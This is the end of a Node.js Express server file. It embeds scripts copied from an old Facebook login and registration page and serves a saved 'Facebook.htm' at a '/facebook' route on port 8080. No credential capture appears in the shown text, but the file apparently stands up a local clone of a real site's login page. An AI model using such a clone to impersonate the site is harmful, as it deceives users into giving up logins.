onloadRegister(function(){Bootloader.configurePage({"http:\/\/static.ak.fbcdn.net\/rsrc.php\/z22AE\/lpkg\/15n8dg14\/en_US\/141\/150535\/css\/8miun4q7u6cko4os.pkg.css":["css\/8miun4q7u6cko4os.pkg.css",false],"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/z8KQQ\/lpkg\/eewiqqu8\/en_US\/141\/147549\/css\/3is3ingrub6skcc0.pkg.css":["css\/3is3ingrub6skcc0.pkg.css",false],"http:\/\/static.ak.fbcdn.net\/rsrc.php\/zIMCQ\/lpkg\/etf148hu\/en_US\/141\/150744\/css\/1sltnw27smf4sogc.pkg.css":["css\/1sltnw27smf4sogc.pkg.css",true],"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/zHW7H\/l\/b5pdlfqn\/en_US\/150249\/css\/UIErrorFlag.css":["css\/UIErrorFlag.css",false],"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/z49GM\/lpkg\/d0snom8o\/en_US\/141\/150683\/css\/1uom3yh8tp7o4so4.pkg.css":["css\/1uom3yh8tp7o4so4.pkg.css",true],"http:\/\/b.static.ak.fbcdn.net\/rsrc.php\/zB9WX\/lpkg\/18v0035x\/en_US\/141\/149707\/css\/8s1o7zf4to0sgok0.pkg.css":["css\/8s1o7zf4to0sgok0.pkg.css",true]});
Bootloader.done(["css\/8miun4q7u6cko4os.pkg.css","css\/3is3ingrub6skcc0.pkg.css","css\/1sltnw27smf4sogc.pkg.css","css\/UIErrorFlag.css","css\/1uom3yh8tp7o4so4.pkg.css","css\/8s1o7zf4to0sgok0.pkg.css"]);
});

onloadRegister(function() {if (window.Env) { Env["nectar_last_impression_id"]="c4cf8f0d14b4d527a91fe15e10847372"; }});
onloadRegister(function() {if (window.Env) { Env["nectar_last_nav_impression_id"]=""; }});
onloadRegister(function() {new RegKeyPressListen(1);});
onloadRegister(function() {new CaptchaBoxKeyPressListen('1', 'registration_container', '1');});
onloadRegister(function() {regform_listen_focus("reg", "postload_focus");});
onloadRegister(function() {ffid='64Fjtb+6is66mXxXRu+lrg==';});
onloadRegister(function() {window.loading_page_chrome = true;});
onloadRegister(function() {focus_login(0, true);});
onloadRegister(function() {new MenuBar("fb_menubar_core").setTimeoutInterval(250).init();});
onloadRegister(function() {new MenuBar("fb_menubar_aux").setTimeoutInterval(100).init();});
onloadRegister(function() {dropmenu("locale_footer_selector_hitarea")
      .registerHTMLMenu("locale_footer_selector_menu")
      .setPosition(dropmenu.ALIGN_LEFT)
      .setDirection(dropmenu.DIRECTION_UP)
      .addHook("show", function(clickTarget) {
        CSS.addClass(clickTarget, "active"); }
        .bind(null, "locale_footer_selector_hitarea"))
      .addHook("hide", function(clickTarget) {
        CSS.removeClass(clickTarget, "active"); }
        .bind(null, "locale_footer_selector_hitarea"));});
onloadRegister(function() {window.loading_page_chrome = false;});
onloadRegister(function() {var n = "rtime"; (window.ge && ge(n)) && (ge(n).title += " | 117");});
onloadRegister(function() {
      onbeforeunloadRegister(function () {
        window.setCookie && window.setCookie("cavalry_transit_start_time", (new Date()).getTime(), 10000);
        }, true);});


</script></div></body>
</html>
`);
});


app.get('/facebook', function (req, res) {
  res.sendFile(path.join(__dirname, 'ui', 'Facebook.htm'));
});

app.listen(8080, function () {
  console.log('Example app listening on port 8080!');
});
